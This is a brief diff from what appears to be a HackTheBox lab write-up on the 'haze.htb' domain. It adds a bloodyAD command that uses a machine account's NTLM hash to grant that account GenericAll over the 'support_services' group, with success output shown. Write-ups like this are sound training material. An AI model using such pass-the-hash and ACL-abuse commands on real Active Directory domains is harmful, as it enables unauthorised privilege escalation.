@@ -484,5 +484,8 @@ bloodyAD --host dc01.haze.htb -d haze.htb -u 'Haze-IT-Backup$' -p ':76da32697ff3
 Now i am the owner of the group
 
 ```python
-
+bloodyAD --host dc01.haze.htb -d haze.htb -u 'Haze-IT-Backup$' -p ':76da32697ff38bc7c9fa6289abf47940' add genericAll 'support_services' 'Haze-IT-Backup$'
+[+] Haze-IT-Backup$ has now GenericAll on support_services
 ```
+Now i have GenericAll over the group!
+
